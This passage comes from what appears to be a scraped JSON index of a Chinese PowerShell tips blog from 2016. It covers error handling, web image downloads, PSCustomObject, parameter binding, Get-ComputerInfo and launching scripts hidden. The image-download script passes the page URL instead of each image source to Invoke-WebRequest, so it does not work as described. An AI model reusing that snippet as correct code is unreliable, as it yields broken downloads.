these characters in file names: : ?","link":"/2016/10/27/check-file-names-for-illegal-characters-directory/"},{"title":"PowerShell 技能连载 - Cmelet 错误报告的简单策略","text":"在 PowerShell 中，您可以创建复杂的错误处理代码，但有些时候您可能只是想知道出了什么错并且把它记录下来。不需要额外的技能。 以下是两个可能会遇到错误的 cmdlet。当这些 cmdlet 执行完成时，您将能通过 $data1 和 $data2 获得它们的执行结果，并在控制台中见到许多红色的错误信息： 12$data1 = Get-ChildItem -Path c:\\windows -Filter *.ps1 -Recurse$data2 = Get-Process -FileVersionInfo 现在看看这个实验： 12$data1 = Get-ChildItem -Path c:\\windows -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable errorList$data2 = Get-Process -FileVersionInfo -ErrorAction SilentlyContinue -ErrorVariable +errorList 要禁止错误输出并同时将红色的错误信息写入自定义的错误变量 $errorList 并不需要做太多工作。请注意 -ErrorVariable 参数接受的是一个变量名（不含 “$“ 前缀）。并请注意在这个变量名前添加 “+“ 前缀将能把错误信息附加到变量中，而不是替换变量的值。 现在，两个 cmdlet 运行起来都看不到错误信息了。最后，您可以容易地在 $errorList 中容易地分析错误信息，例如用 Out-File 将它们写入某些错误日志文件： 123$issues = $errorList.CategoryInfo | Select-Object -Property Category, TargetName$issues$issues | Out-File -FilePath $home\\Desktop\\report.txt -Append","link":"/2016/10/28/simple-strategy-for-cmdlet-error-reporting-directory/"},{"title":"PowerShell 技能连载 - 从网站上下载图片","text":"有许多有趣的网站，其中一个是 www.metabene.de （至少面向德国访访客），有 33 页内容，艺术家展示了他的绘画，并提供免费下载（只允许私人使用·私人使用）。 在类似这种情况中，PowerShell 可以帮助您将手动从网站下载图片的操作自动化。在 PowerShell 3.0 中，引入了一个称为 Invoke-WebRequest 的“PowerShell 浏览器”，它能够将人类在一个真实浏览器中操作的大多数事情自动化。 当您运行这段脚本时，它访问所有的 33 个网页，检查所有的图片链接，并将它们保存到硬盘上： 12345678910111213141516171819202122232425262728# open destination folder (and create it if needed)$folder = 'c:\\drawings'$exists = Test-Path -Path $folderif (!$exists) { $null = New-Item -Path $folder -ItemType Directory }explorer $folder# walk all 33 web pages that www.metabene.de offers1..33 | ForEach-Object { $url = &quot;http://www.metabene.de/galerie/page/$_&quot; # navigate to website... $webpage = Invoke-WebRequest -Uri $url -UseBasicParsing # take sources of all images on this website... $webpage.Images.src | Where-Object { # take only images that were uploaded to this blog $_ -like '*/uploads/*' }} |ForEach-Object { # get filename of URL $filename = $_.Split('/')[-1] # create local file name $destination= Join-Path -Path $Folder -ChildPath $filename # download pictures Invoke-WebRequest -Uri $url -OutFile $destination}","link":"/2016/10/31/downloading-pictures-from-website/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中获得 Cmdlet 的 IntelliSense","text":"如果您在阅读某些加载到 PowerShell ISE 中的 PowerShell 代码，要获取额外信息十分容易。只需要点击想获得详情的 cmdlet，然后按下 CTRL+SPACE 键即可（译者注：可能会和 IME 切换快捷键冲突）。 这将调出 IntelliSense 菜单，即平时按下 “-“ 和 “.” 触发键时显示的菜单。由于只有一个 cmdlet 匹配成功，所以该列表只有一个项目。过一小会儿，就会弹出一个显示该 cmdlet 支持的所有参数的 tooltip。 如果您想了解更多，请按 F1 键。PowerShell ISE 将把当前位置的 cmdlet 名送给 Get-Help 命令。该帮助将在一个独立的新窗口中显示。","link":"/2016/11/01/getting-intellisense-for-cmdlet-powershell-ise/"},{"title":"PowerShell 技能连载 - 用一行代码更新 PowerShell 帮助信息","text":"要获得 PowerShell 最全的输出信息，您需要更新 PowerShell 的帮助至少一次。这将下载并安装当您通过 cmdlet 运行 Get-Help 或是在 PowerShell ISE 中点击一个 cmdlet 并按 F1 时将出现的基础帮助文件集。 更新 PowerShell 帮助需要 Administrator 特权，因为帮助文件存在 Windows 文件夹中。 以下是一个单行命令，演示了如何以管理员特权运行任何 PowerShell 命令。这个命令将更新本地的 PowerShell 帮助文件： 1Start-Process -FilePath powershell -Verb RunAs -ArgumentList &quot;-noprofile -command Update-Help -UICulture en-us -Force&quot;","link":"/2016/11/02/updating-powershell-help-with-one-liner/"},{"title":"PowerShell 技能连载 - 获取 Cmdlet 参数的帮助","text":"在 PowerShell 5.0 中似乎有个 bug，限制了内置帮助窗口的作用。当您以 -ShowWindow 参数运行 Get-Help 命令时，该窗口只显示该 cmdlet 的语法和例子。许多额外信息并没有显示出来。 要获得某个 cmdlet 支持的参数的详细信息，请直接请求该信息。以下代码将解释 Get-Date 中的 -Format 参数是做什么的： PS C:\\&gt; Get-Help -Name Get-Date -Parameter Format -Format [] Displays the date and time in the Microsoft .NET Framework format indicated by the format specifier. Enter a format specifier. For a list of available format specifiers, see DateTimeFormatInfo Class (http://msdn.microsoft.com/library/system.globalization.datetimeformatinfo.aspx) in MSDN. When you use the Format parameter, Windows PowerShell gets only the properties of the DateTime object that it needs to display the date in the format that you specify. As a result, some of the properties and methods of DateTime objects might not be available. Starting in Windows PowerShell 5.0, you can use the following additional formats as values for the Format parameter. -- FileDate. A file or path-friendly representation of the current date in local time. It is in the form of yyyymmdd ( using 4 digits, 2 digits, and 2 digits). An example of results when you use this format is 20150302. -- FileDateUniversal. A file or path-friendly representation of the current date in universal time. It is in the form of yyyymmdd + 'Z' (using 4 digits, 2 digits, and 2 digits). An example of results when you use this format is 20150302Z. -- FileDateTime. A file or path-friendly representation of the current date and time in local time, in 24-hour format. It is in the form of yyyymmdd + 'T' + hhmmssmsms, where msms is a four-character representation of milliseconds. An example of results when you use this format is 20150302T1240514987. -- FileDateTimeUniversal. A file or path-friendly representation of the current date and time in universal time, in 24-hour format. It is in the form of yyyymmdd + 'T' + hhmmssmsms, where msms is a four-character representation of milliseconds, + 'Z'. An example of results when you use this format is 20150302T0840539947Z. Required? false Position? named Default value none Accept pipeline input? false Accept wildcard characters? false 通过这些信息，您现在可以知道如何格式化日期和时间： 123$date = Read-Host -Prompt 'Enter a date'$weekday = Get-Date -Date $date -Format 'dddd'&quot;$date is a $weekday&quot;","link":"/2016/11/03/getting-help-for-cmdlet-parameters/"},{"title":"PowerShell 技能连载 - （分别）测试文件和文件夹","text":"Test-Path 在测试一个文件或文件夹是否存在时十分有用，它可以用在任何 PowerShell 驱动器上。所以它也可以测试一个变量、一个函数，或一个证书是否存在（举个例子）。 In recent PowerShell versions, Test-Path can now differentiate between containers (i.e. folders) and leafs (i.e. files), too: 在近期的 PowerShell 版本中，Test-Path 还可以区分容器（例如文件夹）和叶子（例如文件）： 1234567$path = 'c:\\windows\\explorer.exe'# any item typeTest-Path -Path $path# just filesTest-Path -Path $path -PathType Leaf# just foldersTest-Path -Path $path -PathType Container","link":"/2016/11/04/testing-files-and-folders-separately/"},{"title":"PowerShell 技能连载 - 获取PowerShell Gallery 模块的最新版本","text":"在 www.powershellgallery.com ，Microsoft 发布了一个公开的脚本和模块的仓库。您可以在这里和其他人交流 PowerShell 代码（请见网站）。 要使用这个仓库，您需要 PowerShell 5 或者手动安装 PowerShellGet 模块（在 powershellgallery.com 可以下载到）。接下来您可以使用诸如 Find/Save/Install/Update/Remove-Script/Module 等 cmdlet。 目前缺乏的是一个查看模块当前最新版本号的方法。以下是解决方案： 123456789101112131415161718192021222324function Get-PublishedModuleVersion($Name){ # access the main module page, and add a random number to trick proxies $url = &quot;https://www.powershellgallery.com/packages/$Name/?dummy=$(Get-Random)&quot; $request = [System.Net.WebRequest]::Create($url) # do not allow to redirect. The result is a &quot;MovedPermanently&quot; $request.AllowAutoRedirect=$false try { # send the request $response = $request.GetResponse() # get back the URL of the true destination page, and split off the version $response.GetResponseHeader(&quot;Location&quot;).Split(&quot;/&quot;)[-1] -as [Version] # make sure to clean up $response.Close() $response.Dispose() } catch { Write-Warning $_.Exception.Message }}Get-PublishedModuleVersion -Name ISESteroids 当您运行 Get-PublishedModuleVersion 并传入发布的模块名，执行结果类似如下： PS C:\\&gt; Get-PublishedModuleVersion -Name ISESteroids Major Minor Build Revision ----- ----- ----- -------- 2 6 3 25 这个操作非常非常快，而且可以用来检测已安装的模块，看它们是否是最新版本。","link":"/2016/11/07/getting-latest-powershell-gallery-module-version/"},{"title":"PowerShell 技能连载 - 利用命令行历史","text":"PowerShell 将您的所有交互命令行输入“记录”到它的命令行历史中，而 Get-History 负责显示它们。如果您运行了一段时间 PowerShell 并且觉得运行的效果不错，那么可以用以下脚本将所有的交互命令从命令行历史中复制到剪贴板中。接下来您可以将它们粘贴到 PowerShell ISE 中，并使之成为一个脚本： 1234567891011121314151617# define how old your commands may be at most to be included$MaxAgeHours = 4# get all command history items that were started after this$DateLimit = (Get-Date).AddHours(-$MaxAgeHours)# get all command-line commandsGet-History | # exclude all that were aborted Where-Object ExecutionStatus -eq Completed | # exclude all that are older than the limit set above Where-Object StartExecutionTime -gt $DateLimit | # get just the command-line Select-Object -ExpandProperty CommandLine | # copy all to clipboard clip.exe","link":"/2016/11/08/exploiting-your-command-history/"},{"title":"PowerShell 技能连载 - 创建新对象的快速方法","text":"要将一系列信息打包起来的最好方法就是将它们存储在自定义对象中。最简单最快捷的方法就是用 PSCustomObject： 12345678#requires -Version 3.0$o = [PSCustomObject]@{ Date = Get-Date BIOS = Get-WmiObject -Class Win32_BIOS Computer = $env:COMPUTERNAME OS = [Environment]::OSVersion Remark = 'Some remark'} 在大括号内，将一系列信息（或命令执行结果）存储在键中。这将创建一个将包含一系列信息的对象： PS C:\\&gt; $o ​ Date : 10/28/2016 3:47:27 PM BIOS : \\DESKTOP-7AAMJLF\\root\\cimv2:Win32_BIOS.Name=”1.4.4”,SoftwareElementID=”1.4.4”,SoftwareElementState=3,TargetOpera tingSystem=0,Version=”DELL - 1072009” Computer : DESKTOP-7AAMJLF OS : Microsoft Windows NT 10.0.14393.0 Remark : Some remark ​​ PS C:&gt; $o.Remark Some remark PS C:\\&gt; $o.OS Platform ServicePack Version VersionString -------- ----------- ------- ------------- Win32NT 10.0.14393.0 Microsoft Windows NT 10.0.14393.0 ​ PS C:&gt; $o.OS.VersionString Microsoft Windows NT 10.0.14393.0 PS C:\\&gt;","link":"/2016/11/09/fast-approach-to-creating-new-objects/"},{"title":"PowerShell 技能连载 - PSCustomObject 到底如何工作","text":"在前一个技能中我们介绍了如何快速用 PSCustomObject 创建一个新对象： $o = [PSCustomObject]@{ Date = Get-Date BIOS = Get-WmiObject -Class Win32_BIOS Computer = $env:COMPUTERNAME OS = [Environment]::OSVersion Remark = 'Some remark' } 实际中，[PSCustomObject] 并不是一个类型，并且也不是在转型一个哈希表。这个场景背后实际发生的是两个步骤的组合，您也可以分别执行这两个步骤： 12345678910111213#requires -Version 3.0# create an ordered hash table$hash = [Ordered]@{ Date = Get-Date BIOS = Get-WmiObject -Class Win32_BIOS Computer = $env:COMPUTERNAME OS = [Environment]::OSVersion Remark = 'Some remark'}# turn hash table in object$o = New-Object -TypeName PSObject -Property $hash 由于这段代码用到了 PowerShell 3.0 引入的排序的哈希表，所以无法在 PowerShell 2.0 中使用相同的做法。要支持 PowerShell 2.0 ，请用无序的（传统的）哈希表代替： 123456789101112131415#requires -Version 2.0# create a hash table$hash = @{ Date = Get-Date BIOS = Get-WmiObject -Class Win32_BIOS Computer = $env:COMPUTERNAME OS = [Environment]::OSVersion Remark = 'Some remark'}# turn hash table in object$o = New-Object -TypeName PSObject -Property $hash$o","link":"/2016/11/10/how-pscustomobject-really-works/"},{"title":"PowerShell 技能连载 - 使用 Add-Member 时请注意！","text":"Add-Member 常用来创建自定义对象，例如： 12345$o = New-Object -TypeName PSObject$o | Add-Member -MemberType NoteProperty -Name Notes -Value 'Something'$o | Add-Member -MemberType NoteProperty -Name Date -Value (Get-Date)$o 这可以工作，结果类似这样： PS C:\\&gt; $o Notes Date ----- ---- Something 10/28/2016 3:56:53 PM 然而，这样做效率不高。因为 Add-Member 时动态地扩展现有的对象，而不是创建新的对象。以上代码可以用这种方法更容易地实现： 123456$o = [PSCustomObject]@{ Notes = 'Something' Date = Get-Date }$o Add-Member 可以做更多高级的事情，例如添加脚本属性和方法。请检查当您向以上对象添加动态脚本属性时发生了什么： 123456$o = [PSCustomObject]@{ Notes = 'Something' Date = Get-Date }$o | Add-Member -MemberType ScriptProperty -Name CurrentDate -Value { Get-Date } 现在请看多次查询该对象时，它的 Date 和 CurrentDate 属性 123456789101112131415161718192021PS C:\\&gt; $oNotes Date CurrentDate----- ---- -----------Something 10/28/2016 4:01:54 PM 10/28/2016 4:01:57 PM​PS C:\\&gt; $oNotes Date CurrentDate----- ---- -----------Something 10/28/2016 4:01:54 PM 10/28/2016 4:02:00 PM​PS C:\\&gt; $oNotes Date CurrentDate----- ---- -----------Something 10/28/2016 4:01:54 PM 10/28/2016 4:02:02 PM Date 属性返回的是静态信息而CurrentDate 属性总是返回当前时间，因为它的值是一个脚本，每次查询这个属性的时候都会执行一次。","link":"/2016/11/11/careful-with-add-member/"},{"title":"PowerShell 技能连载 - 本地帐户的内置支持","text":"从 PowerShell 5.1 开始，终于内置支持了本地用户账户。PowerShell 5.1 现在支持 Windows 10 和 Windows Server 2016： PS C:\\&gt; Get-Command -Module *LocalAccounts | Select-Object -ExpandProperty Name Add-LocalGroupMember Disable-LocalUser Enable-LocalUser Get-LocalGroup Get-LocalGroupMember Get-LocalUser New-LocalGroup New-LocalUser Remove-LocalGroup Remove-LocalGroupMember Remove-LocalUser Rename-LocalGroup Rename-LocalUser Set-LocalGroup Set-LocalUser","link":"/2016/11/14/built-in-support-for-local-accounts/"},{"title":"PowerShell 技能连载 - systeminfo.exe 的最新替代","text":"曾几何时，systeminfo.exe 返回一台电脑所有的分析信息，并且有一些能够在 PowerShell 中变成面向对象的： PS C:\\&gt; $info = systeminfo.exe /FO CSV | ConvertFrom-Csv PS C:\\&gt; $info.Domain WORKGROUP PS C:\\&gt; $info.'Logon Server' \\\\DESKTOP-7AAMJLF 在 PowerShell 5.1 （Windows 10 和 Server 2016 ）中，有一个现代的替代品： PS C:\\&gt; Get-ComputerInfo WindowsBuildLabEx : 14393.321.amd64fre.rs1_release_inmarket.161004-2338 WindowsCurrentVersion : 6.3 WindowsEditionId : Professional WindowsInstallationType : Client WindowsInstallDateFromRegistry : 8/17/2016 1:40:27 PM WindowsProductId : 00350-50721-50845-ACOEM WindowsProductName : Windows 10 Pro WindowsRegisteredOrganization : WindowsRegisteredOwner : topoftheworld WindowsSystemRoot : C:\\WINDOWS BiosCharacteristics : {7, 9, 11, 12...} BiosBIOSVersion : {DELL - 1072009, 1.4.4, American Megatrends - 5000B} BiosBuildNumber : BiosCaption : 1.4.4 BiosCodeSet : BiosCurrentLanguage : en|US|iso8859-1 BiosDescription : 1.4.4 BiosEmbeddedControllerMajorVersion : 255 BiosEmbeddedControllerMinorVersion : 255 BiosFirmwareType : Uefi BiosIdentificationCode : BiosInstallableLanguages : 2 BiosInstallDate : BiosLanguageEdition : BiosListOfLanguages : {en|US|iso8859-1, } BiosManufacturer : Dell Inc. BiosName : 1.4.4 BiosOtherTargetOS : BiosPrimaryBIOS : True BiosReleaseDate : 6/14/2016 2:00:00 AM BiosSeralNumber : DLGQD72 BiosSMBIOSBIOSVersion : 1.4.4 BiosSMBIOSMajorVersion : 2 BiosSMBIOSMinorVersion : 8 BiosSMBIOSPresent : True BiosSoftwareElementState : Running BiosStatus : OK BiosSystemBiosMajorVersion : 1 BiosSystemBiosMinorVersion : 4 BiosTargetOperatingSystem : 0 BiosVersion : DELL - 1072009 CsAdminPasswordStatus : Unknown CsAutomaticManagedPagefile : True CsAutomaticResetBootOption : True CsAutomaticResetCapability : True CsBootOptionOnLimit : CsBootOptionOnWatchDog : CsBootROMSupported : True CsBootStatus : {0, 0, 0, 0...} CsBootupState : Normal boot CsCaption : CLIENT CsChassisBootupState : Safe CsChassisSKUNumber : Laptop CsCurrentTimeZone : 120 CsDaylightInEffect : True CsDescription : AT/AT COMPATIBLE CsDNSHostName : DESKTOP-7AAMJLF CsDomain : WORKGROUP CsDomainRole : StandaloneWorkstation CsEnableDaylightSavingsTime : True CsFrontPanelResetStatus : Unknown CsHypervisorPresent : False CsInfraredSupported : False CsInitialLoadInfo : CsInstallDate : CsKeyboardPasswordStatus : Unknown CsLastLoadInfo : CsManufacturer : Dell Inc. CsModel : XPS 13 9350 CsName : CLIENT CsNetworkAdapters : {WiFi, Bluetooth-Netzwerkverbindung} CsNetworkServerModeEnabled : True CsNumberOfLogicalProcessors : 4 CsNumberOfProcessors : 1 CsProcessors : {Intel(R) Core(TM) i7-6500U CPU @ 2.50GHz} CsOEMStringArray : {Dell System, 1[0704], 3[1.0], 12[www.dell.com]...} CsPartOfDomain : False CsPauseAfterReset : -1 CsPCSystemType : Mobile CsPCSystemTypeEx : Mobile CsPowerManagementCapabilities : CsPowerManagementSupported : CsPowerOnPasswordStatus : Unknown CsPowerState : Unknown CsPowerSupplyState : Safe CsPrimaryOwnerContact : CsPrimaryOwnerName : user@company.de CsResetCapability : Other CsResetCount : -1 CsResetLimit : -1 CsRoles : {LM_Workstation, LM_Server, NT, Potential_Browser...} CsStatus : OK CsSupportContactDescription : CsSystemFamily : CsSystemSKUNumber : 0704 CsSystemType : x64-based PC CsThermalState : Safe CsTotalPhysicalMemory : 17045016576 CsPhyicallyInstalledMemory : 16777216 CsUserName : CLIENT12\\TEST CsWakeUpType : PowerSwitch CsWorkgroup : WORKGROUP OsName : Microsoft Windows 10 Pro OsType : WINNT OsOperatingSystemSKU : 48 OsVersion : 10.0.14393 OsCSDVersion : OsBuildNumber : 14393 OsHotFixes : {KB3176936, KB3194343, KB3199209, KB3199986...} OsBootDevice : \\Device\\HarddiskVolume1 OsSystemDevice : \\Device\\HarddiskVolume3 OsSystemDirectory : C:\\WINDOWS\\system32 OsSystemDrive : C: OsWindowsDirectory : C:\\WINDOWS OsCountryCode : 1 OsCurrentTimeZone : 120 OsLocaleID : 0409 OsLocale : en-US OsLocalDateTime : 10/28/2016 4:11:51 PM OsLastBootUpTime : 10/19/2016 7:48:03 AM OsUptime : 9.08:23:47.7627676 OsBuildType : Multiprocessor Free OsCodeSet : 1252 OsDataExecutionPreventionAvailable : True OsDataExecutionPrevention32BitApplications : True OsDataExecutionPreventionDrivers : True OsDataExecutionPreventionSupportPolicy : OptIn OsDebug : False OsDistributed : False OsEncryptionLevel : 256 OsForegroundApplicationBoost : Maximum OsTotalVisibleMemorySize : 16645524 OsFreePhysicalMemory : 9128212 OsTotalVirtualMemorySize : 19135892 OsFreeVirtualMemory : 8607696 OsInUseVirtualMemory : 10528196 OsTotalSwapSpaceSize : OsSizeStoredInPagingFiles : 2490368 OsFreeSpaceInPagingFiles : 2442596 OsPagingFiles : {C:\\pagefile.sys} OsHardwareAbstractionLayer : 10.0.14393.206 OsInstallDate : 8/17/2016 3:40:27 PM OsManufacturer : Microsoft Corporation OsMaxNumberOfProcesses : 4294967295 OsMaxProcessMemorySize : 137438953344 OsMuiLanguages : {de-DE, en-US} OsNumberOfLicensedUsers : OsNumberOfProcesses : 157 OsNumberOfUsers : 2 OsOrganization : OsArchitecture : 64-bit OsLanguage : de-DE OsProductSuites : {TerminalServicesSingleSession} OsOtherTypeDescription : OsPAEEnabled : OsPortableOperatingSystem : False OsPrimary : True OsProductType : WorkStation OsRegisteredUser : test@company.com OsSerialNumber : 00330-50021-50665-AAOEM OsServicePackMajorVersion : 0 OsServicePackMinorVersion : 0 OsStatus : OK OsSuites : {TerminalServices, TerminalServicesSingleSession} OsServerLevel : KeyboardLayout : de-DE TimeZone : (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna LogonServer : \\\\CLIENT PowerPlatformRole : Mobile HyperVisorPresent : False HyperVRequirementDataExecutionPreventionAvailable : True HyperVRequirementSecondLevelAddressTranslation : True HyperVRequirementVirtualizationFirmwareEnabled : True HyperVRequirementVMMonitorModeExtensions : True DeviceGuardSmartStatus : Off DeviceGuardRequiredSecurityProperties : DeviceGuardAvailableSecurityProperties : DeviceGuardSecurityServicesConfigured : DeviceGuardSecurityServicesRunning : DeviceGuardCodeIntegrityPolicyEnforcementStatus : DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus :","link":"/2016/11/15/modern-replacement-for-systeminfo-exe/"},{"title":"PowerShell 技能连载 - 在同一台机器上运行 32 位代码","text":"如果您需要在 64 位脚本中运行 32 位 PowerShell 代码，假设您是管理员，并且使用远程操作功能，您可以远程操作您的系统： 1234567$code = { [IntPtr]::Size Get-Process}Invoke-Command -ScriptBlock $code -ConfigurationName microsoft.powershell32 -ComputerName $env:COMPUTERNAME 这将在 32 位环境中运行 $code 中的脚本块。该指针返回的 size 是 4，这是 32 位的证据。当您直接运行脚本块，返回的是 8 字节（64 比特）。","link":"/2016/11/16/running-32-bit-code-on-the-same-machine/"},{"title":"PowerShell 技能连载 - 探索函数源码","text":"在 PowerShell 中，cmdlet 和 function 的唯一根本区别是它们是怎么编程的：函数用的是纯粹的 PowerShell 代码，这也是查看它们的源代码，并学习新东西的有趣之处。 这行代码列出所有当前从 module 中加载的所有 PowerShell function： 1Get-Module | ForEach-Object { Get-Command -Module $_.Name -CommandType Function } 一旦您知道了内存中某个函数的名字，可以用这种方法快捷查看它的源代码。在这些例子中，我们将探索 Format-Hex 函数。只需要将这个名字替换成内存中存在的其它函数名即可： 1${function:Format-Hex} | clip.exe 这行代码将源代码存入剪贴板，您可以将它粘贴到您喜欢的编辑器中。另外，您也可以用这种方式运行： 123Get-Command -Name Format-Hex -CommandType Function | Select-Object -ExpandProperty Definition | clip.exe","link":"/2016/11/17/exploring-function-source-code/"},{"title":"PowerShell 技能连载 - PowerShell 5.1 中的时区管理","text":"PowerShell 5.1（随 Windows 10 和 Server 2016 发布）带来一系列管理计算机时区的新 cmdlet。Get-TimeZone 返回当前的设置，而 Set-TimeZone 可以改变时区设置： PS C:\\&gt; Get-TimeZone Id : W. Europe Standard Time DisplayName : (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna StandardName : W. Europe Standard Time DaylightName : W. Europe Daylight Time BaseUtcOffset : 01:00:00 SupportsDaylightSavingTime : True","link":"/2016/11/18/time-zone-management-in-powershell-5-1/"},{"title":"PowerShell 技能连载 - 隐藏启动 PowerShell","text":"有时候 PowerShell 脚本只是用来生成某些东西，比如说生成报告，而不需要用 Excel 或记事本打开它。这时候您不会希望执行 PowerShell 的时候显示 PowerShell 控制台窗口。 并没有很简单的方法能隐藏 PowerShell 的控制台窗口，因为即使用了 -WindowsStyle Hidden 参数，也会先显示控制台，然后隐藏它（一闪而过）。 一种方法是使用 Windows 快捷方式来启动脚本。右键单击桌面的空白区域，然后选择新建/快捷方式。就可以新建一个快捷方式。当提示输入地址的时候，键入这行代码： 1powershell -noprofile -executionpolicy bypass -file &quot;c:\\path\\to\\script.ps1&quot; 点击“下一步”，然后添加脚本的名称，再点击“下一步”，就接近完成了。这个快捷方式显示蓝色的 PowerShell 图标。单击它的时候，脚本即可运行，只是还不是隐藏的。 您现在只需要右键单击新创建的快捷方式，选择“属性”，然后将“运行”的设置从“正常窗口”改为您想要的设置。您也可以设置一个快捷方式，这需要管理员权限。 一个缺点是，在 Windows 10 中，“运行”的设置不再包含隐藏程序的选项。您最多可以最小化执行。","link":"/2016/11/21/launching-powershell-hidden/"},{"title":"PowerShell 技能连载 - 在 PowerShell 函数中使用命名的函数","text":"当您创建一个 PowerShell 函数时，所有参数都有默认的位置，除非人为地加上“Position”属性。一旦加上这个属性，所有不带“Position”的参数将立刻变为命名的必须参数。让我们看看例子： 这是一个经典的函数定义，创建了三个固定位置的参数： 1234567891011function Test-Command{ param ( [string]$Name, [int]$ID, [string]$Email ) # TODO: Code using the parameter values} 语法如下： 1Test-Command [[-Name] &lt;string&gt;] [[-ID] &lt;int&gt;] [[-Email] &lt;string&gt;] 一旦您在任何一个参数上添加“Position”属性，其它的就变为命名的参数： 12345678910111213function Test-Command{ param ( [Parameter(Position=0)] [string]$Name, [Parameter(Position=1)] [int]$ID, [string]$Email ) # TODO: Code using the parameter values} 以下是它的语法： 1Test-Command [[-Name] &lt;string&gt;] [[-ID] &lt;int&gt;] [-Email &lt;string&gt;] [&lt;CommonParameters&gt;] 区别在哪？您不需要指定参数名 -Name 和 -ID，但如果您希望为第三个参数指定一个值，必须指定 -Email。在第一个例子中，所有三个参数都可以按照位置来定位。","link":"/2016/11/22/using-named-parameters-in-powershell-functions/"},{"title":"PowerShell 技能连载 - 禁止按位置的参数","text":"当您创建 PowerShell 函数时，参数可以是命名的也可以是按位置的。以下是一个例子： 如果您想检测文件系统中的非法字符，以下是一个简单的适配： 12345678910111213function Test-Command{ param ( [string]$Name, [int]$Id ) &quot;Name: $Name ID: $ID&quot;}Test-Command -Name Weltner -Id 12Test-Command Weltner 12 如您所见，使用按位置的参数（只需要指定参数，不需要显式地指定参数名）可能更适用于为特定目的编写的代码，但是可读性更差。这是有可能的，因为上述函数的语法看起来如下： 1Test-Command [[-Name] &lt;string&gt;] [[-Id] &lt;int&gt;] 那么一个编写一个效果相反的 PowerShell 函数，实现这种语法呢： 1Test-Command [-Name &lt;string&gt;] [-Id &lt;int&gt;] [&lt;CommonParameters&gt;] 目前这个方法比较生僻，不过是完全可行的： 12345678910111213function Test-Command{ param ( [Parameter(ParameterSetName='xy')] [string]$Name, [Parameter(ParameterSetName='xy')] [int]$Id ) &quot;Name: $Name ID: $ID&quot;} 一旦开始使用参数集合，缺省情况下所有参数都是命名的参数。","link":"/2016/11/23/prohibiting-positional-parameters/"},{"title":"PowerShell 技能连载 - 修复 PowerShell 5 帮助的 Bug","text":"使用 Update-Help 下载 PowerShell 的帮助文件时，PowerShell 5 有一个 bug，目前可以修复：基于文本的帮助文件扩展名是“.txt”而不是“.help.txt”，所以 PowerShell 帮助系统会忽略它们。您可以自己试验一下——以下命令可能会返回一大堆关于主题： 123456789101112131415161718192021PS C:\\&gt; Get-Help about*Name Category Module Synopsis---- -------- ------ --------about_Aliases HelpFile SHORT DESCRIPTIONabout_Arithmetic_Operators HelpFile SHORT DESCRIPTIONabout_Arrays HelpFile SHORT DESCRIPTIONabout_Assignment_Operators HelpFile SHORT DESCRIPTIONabout_Automatic_Variables HelpFile SHORT DESCRIPTIONabout_Break HelpFile SHORT DESCRIPTIONabout_Classes HelpFile SHORT DESCRIPTIONabout_Command_Precedence HelpFile SHORT DESCRIPTIONabout_Command_Syntax HelpFile SHORT DESCRIPTIONabout_Comment_Based_Help HelpFile SHORT DESCRIPTIONabout_CommonParameters HelpFile SHORT DESCRIPTIONabout_Comparison_Operators HelpFile SHORT DESCRIPTIONabout_Continue HelpFile SHORT DESCRIPTIONabout_Core_Commands HelpFile SHORT DESCRIPTIONabout_Data_Sections HelpFile SHORT DESCRIPTIONabout_Debuggers HelpFile SHORT DESCRIPTIONabout_DesiredStateConfiguration HelpFile SHORT DESCRIPTION 如果没有显示上述的内容，您也许还没有事先运行过 Update-Help 来下载帮助文件，或者您被 bug 吃了。 无论这个 bug 是否正在修复中，用 PowerShell 您可以轻松地修改这些东西。以下是一个用于修复这些受影响的帮助文件的扩展名的脚本。 这个脚本需要管理员权限，因为帮助文件是位于受保护的 Windows 文件夹中： 1234567# find all text files inside the PowerShell folder that start# with &quot;about&quot;Get-ChildItem -Path $pshome -Filter about*.txt -Recurse | # identify those that do not end with &quot;.help.txt&quot; Where-Object { $_.Name -notlike '*.help.txt' } | # rename the extension using a regex: Rename-Item -NewName { $_.Name -replace '\\.txt$', '.help.txt'}","link":"/2016/11/24/fixing-powershell-5-help-bug/"},{"title":"PowerShell 技能连载 - 轻轻跳进 PowerShell 版本的丛林","text":"PowerShell 同时有五个主要版本在发行。除掉最新的小版本，例如 Windows 10 和 Server 2016 上的 PowerShell 5.1。加上 beta 版和预发行版本，以及 Linux 和 Nano 服务器上的 PowerShell。哇哦！ 要跟踪这些版本，并知道正在用哪个版本、它从哪里来、可能有哪些兼容性问题很不容易。MVP 大学里的 Egil Ring 维护着一个很酷的模块。如果您装了 PowerShell 5 或从 powershellgallery.com 安装了 PowerShellGet，您可以用一行代码下载这个模块： 1PS C:\\&gt; Install-Module -Name PSVersion -Scope CurrentUser 回答几个问题后，该模块安装完成。它只包含两个命令： 123456PS C:\\&gt; Get-Command -Module PSVersionCommandType Name Version Source----------- ---- ------- ------Function Get-PSVersion 1.6 PSVersionFunction Update-PSVersionData 1.6 PSVersion PSVersion 是一个社区项目，跟踪 PowerShell 的发行编号、它们的含义、它们的来源： 123456789101112131415161718PS C:\\&gt; Get-PSVersion -ListVersionName FriendlyName ApplicableOS---- ------------ ------------5.1.14393.0 Windows PowerShell 5.1 Preview Windows 10 Anniversar...5.1.14300.1000 Windows PowerShell 5.1 Preview Windows Server 2016 T...5.0.10586.494 Windows PowerShell 5 RTM Windows 10 1511 + KB3...5.0.10586.122 Windows PowerShell 5 RTM Windows 10 1511 + KB3...5.0.10586.117 Windows PowerShell 5 RTM 1602 Windows Server 2012 R...5.0.10586.63 Windows PowerShell 5 RTM Windows 10 1511 + KB3...5.0.10586.51 Windows PowerShell 5 RTM 1512 Windows Server 2012 R...5.0.10514.6 Windows PowerShell 5 Production Preview 1508 Windows Server 2012 R25.0.10018.0 Windows PowerShell 5 Preview 1502 Windows Server 2012 R25.0.9883.0 Windows PowerShell 5 Preview November 2014 Windows Server 2012 R...4.0 Windows PowerShell 4 RTM Windows Server 2012 R...3.0 Windows PowerShell 3 RTM Windows Server 2012, ...2.0 Windows PowerShell 2 RTM Windows Server 2008 R...1.0 Windows PowerShell 1 RTM Windows Server 2008, ... 这是在您的企业中以友好的 PowerShell 版本名称获得 PowerShell 版本号的方法： 12345PS C:\\&gt; Get-PSVersionPSComputerName PSVersion PSVersionFriendlyName-------------- --------- ---------------------CLIENT12 5.1.14393.0 